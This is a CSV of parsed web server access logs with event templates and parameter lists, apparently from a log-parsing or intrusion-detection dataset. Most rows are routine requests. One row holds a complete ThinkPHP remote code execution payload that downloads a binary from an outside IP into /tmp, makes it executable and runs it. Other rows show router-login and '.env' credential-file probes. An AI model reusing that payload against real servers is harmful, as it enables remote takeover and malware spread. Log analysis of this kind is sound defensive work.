LineId,IP,Time,Content,EventId,EventTemplate,ParameterList
48,172.31.1.254,26/Sep/2021:03:53:02 +0800,"""POST /boaform/admin/formLogin HTTP/1.1"" 404 124 ""http://112.17.251.82:80/admin/login.asp"" ""Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"" ""-""",55f54f0c,"""POST /boaform/admin/formLogin HTTP/<*>.<*>"" <*> <*> ""http:/<*>/admin/login.asp"" ""Mozilla/<*>.<*> (X11; Ubuntu; Linux x86_<*>; rv:<*>.<*>) Gecko/<*> Firefox/<*>.<*>"" ""-""","['1.1', '404 124', '/112.17.251.82:80', '5.0', '64', '71.0', '20100101', '71.0']"
49,172.31.1.254,26/Sep/2021:03:53:02 +0800,""""" 400 0 ""-"" ""-"" ""-""",fec19c0b,""""" <*> <*> ""-"" ""-"" ""-""",['400 0']
256,172.31.1.254,26/Sep/2021:05:28:44 +0800,"""GET / HTTP/1.1"" 200 332 ""-"" ""Mozilla/5.0 (Linux; U; Android 4.4.4; zh-CN; HUAWEI ALE-CL00 Build/HuaweiALE-CL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.0.907 Mobile Safari/537.36"" ""-""",57091849,"""GET / HTTP/<*>.<*>"" <*> <*> ""-"" ""Mozilla/<*>.<*> (Linux; U; Android <*>.<*>.<*>; zh-CN; HUAWEI ALE-CL00 Build/HuaweiALE-CL00) AppleWebKit/<*>.<*> (KHTML, like Gecko) Version/<*>.<*> Chrome<*> UCBrowser<*> Mobile Safari/<*>.<*>"" ""-""","['1.1', '200 332', '5.0', '4', '4.4', '537.36', '4.0', '/40.0.2214.89', '/11.3.0.907', '537.36']"
276,172.31.1.254,26/Sep/2021:05:36:25 +0800,"""GET / HTTP/1.1"" 200 255 ""-"" ""Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"" ""-""",8b23d509,"""GET <*> HTTP/<*>.<*>"" <*> <*> ""-"" ""Mozilla/<*>.<*> (X11; Ubuntu; Linux x86_<*>; rv:<*>.<*>) Gecko/<*> Firefox/<*>.<*>"" ""-""","['/', '1.1', '200 255', '5.0', '64', '76.0', '20100101', '76.0']"
465,172.31.1.254,26/Sep/2021:06:56:09 +0800,"""GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://88.218.227.141/YourName/BinName.x86 -O /tmp/.Fdp; chmod 777 /tmp/.Fdp; /tmp/.Fdp ThinkPHP.x86.Selfrep' HTTP/1.1"" 400 157 ""-"" ""Tsunami/2.0"" ""-""",8861b146,"""GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[<*>]=shell_exec&vars[<*>][]= 'wget http:/<*>/YourName/BinName.x86 -O /tmp/.Fdp; chmod <*> /tmp/.Fdp; /tmp/.Fdp ThinkPHP.x86.Selfrep' HTTP/<*>.<*>"" <*> <*> ""-"" ""Tsunami/<*>.<*>"" ""-""","['0', '1', '/88.218.227.141', '777', '1.1', '400 157', '2.0']"
710,172.31.1.254,26/Sep/2021:07:49:04 +0800,"""HEAD / HTTP/1.1"" 200 0 ""-"" ""Microsoft Office Excel 2013"" ""-""",9f113bd3,"""HEAD / HTTP/<*>.<*>"" <*> <*> ""-"" ""Microsoft Office Excel <*>"" ""-""","['1.1', '200 0', '2013']"
974,172.31.1.254,26/Sep/2021:07:57:31 +0800,"""HEAD / HTTP/1.1"" 200 0 ""-"" ""Microsoft Office Excel 2013"" ""-""",9f113bd3,"""HEAD / HTTP/<*>.<*>"" <*> <*> ""-"" ""Microsoft Office Excel <*>"" ""-""","['1.1', '200 0', '2013']"
1546,172.31.1.254,26/Sep/2021:08:10:41 +0800,"""GET / HTTP/1.1"" 200 332 ""-"" ""Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)"" ""-""",7055538c,"""GET <*> HTTP/<*>.<*>"" <*> <*> ""-"" ""Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; .NET CLR <*>.<*>.<*>)"" ""-""","['/', '1.1', '200 332', '4.0', '7.0', '5.1', '2', '0.50727']"
1547,172.31.1.254,26/Sep/2021:08:10:42 +0800,"""GET /favicon.ico HTTP/1.1"" 404 555 ""-"" ""Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)"" ""-""",7055538c,"""GET <*> HTTP/<*>.<*>"" <*> <*> ""-"" ""Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; .NET CLR <*>.<*>.<*>)"" ""-""","['/favicon.ico', '1.1', '404 555', '4.0', '7.0', '5.1', '2', '0.50727']"
1857,172.31.1.254,26/Sep/2021:08:24:11 +0800,"""\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xEAo\x0E\xC4-TT.D\x8A\x8B\x84\x0E\x1Cb2\xB0\xBE\x8D3\x8E&\x97n\x88\xA8\xE1\x81L\xE5\xDC\xDC\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0"" 400 157 ""-"" ""-"" ""-""",f907ae25,"""\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xEAo\x0E\xC4-TT.D\x8A\x8B\x84\x0E\x1Cb2\xB0\xBE\x8D3\x8E&\x97n\x88\xA8\xE1\x81L\xE5\xDC\xDC\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0"" <*> <*> ""-"" ""-"" ""-""",['400 157']
1891,172.31.1.254,26/Sep/2021:08:39:08 +0800,"""GET /.env HTTP/1.1"" 404 184 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"" ""-""",59b09335,"""GET /.env HTTP/<*>.<*>"" <*> <*> ""-"" ""Mozilla/<*>.<*> (X11; Linux x86_<*>) AppleWebKit/<*>.<*> (KHTML, like Gecko) Chrome<*> Safari/<*>.<*>"" ""-""","['1.1', '404 184', '5.0', '64', '537.36', '/81.0.4044.129', '537.36']"
1892,172.31.1.254,26/Sep/2021:08:39:09 +0800,"""POST / HTTP/1.1"" 405 559 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"" ""-""",52995d7c,"""POST / HTTP/<*>.<*>"" <*> <*> ""-"" ""Mozilla/<*>.<*> (X11; Linux x86_<*>) AppleWebKit/<*>.<*> (KHTML, like Gecko) Chrome<*> Safari/<*>.<*>"" ""-""","['1.1', '405 559', '5.0', '64', '537.36', '/81.0.4044.129', '537.36']"
1902,172.31.1.254,26/Sep/2021:08:43:31 +0800,"""GET /Public/kindeditor/kindeditor.js HTTP/1.1"" 404 124 ""-"" ""python-requests/2.26.0"" ""-""",546d0480,"""GET /Public/kindeditor/kindeditor.js HTTP/<*>.<*>"" <*> <*> ""-"" ""python-requests/<*>.<*>.<*>"" ""-""","['1.1', '404 124', '2', '26.0']"
2210,172.31.1.254,26/Sep/2021:09:03:34 +0800,"""GET /.env HTTP/1.1"" 404 184 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"" ""-""",59b09335,"""GET /.env HTTP/<*>.<*>"" <*> <*> ""-"" ""Mozilla/<*>.<*> (X11; Linux x86_<*>) AppleWebKit/<*>.<*> (KHTML, like Gecko) Chrome<*> Safari/<*>.<*>"" ""-""","['1.1', '404 184', '5.0', '64', '537.36', '/81.0.4044.129', '537.36']"
2211,172.31.1.254,26/Sep/2021:09:03:36 +0800,"""POST / HTTP/1.1"" 405 559 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"" ""-""",52995d7c,"""POST / HTTP/<*>.<*>"" <*> <*> ""-"" ""Mozilla/<*>.<*> (X11; Linux x86_<*>) AppleWebKit/<*>.<*> (KHTML, like Gecko) Chrome<*> Safari/<*>.<*>"" ""-""","['1.1', '405 559', '5.0', '64', '537.36', '/81.0.4044.129', '537.36']"
2474,172.31.1.254,26/Sep/2021:09:08:53 +0800,"""GET / HTTP/1.1"" 200 255 ""https://www.google.com/"" ""Mozilla/5.0 (X11; Linux i586; rv:31.0) Gecko/20100101 Firefox/68.0"" ""127.0.0.1""",ad90aa53,"""GET / HTTP/<*>.<*>"" <*> <*> ""https://www.google.com/"" ""Mozilla/<*>.<*> (X11; Linux i586; rv:<*>.<*>) Gecko/<*> Firefox/<*>.<*>"" ""<*>""","['1.1', '200 255', '5.0', '31.0', '20100101', '68.0', '127.0.0.1']"
2690,172.31.1.254,26/Sep/2021:09:09:56 +0800,"""GET / HTTP/1.1"" 200 255 ""-"" ""Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_4_11; fr) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Safari/533.16"" ""-""",a4ef70c9,"""GET / HTTP/<*>.<*>"" <*> <*> ""-"" ""Mozilla/<*>.<*> (Macintosh; U; PPC Mac OS X <*>_<*>_<*>; fr) AppleWebKit/<*>.<*> (KHTML, like Gecko) Version/<*>.<*> Safari/<*>.<*>"" ""-""","['1.1', '200 255', '5.0', '10', '4_11', '533.16', '5.0', '533.16']"
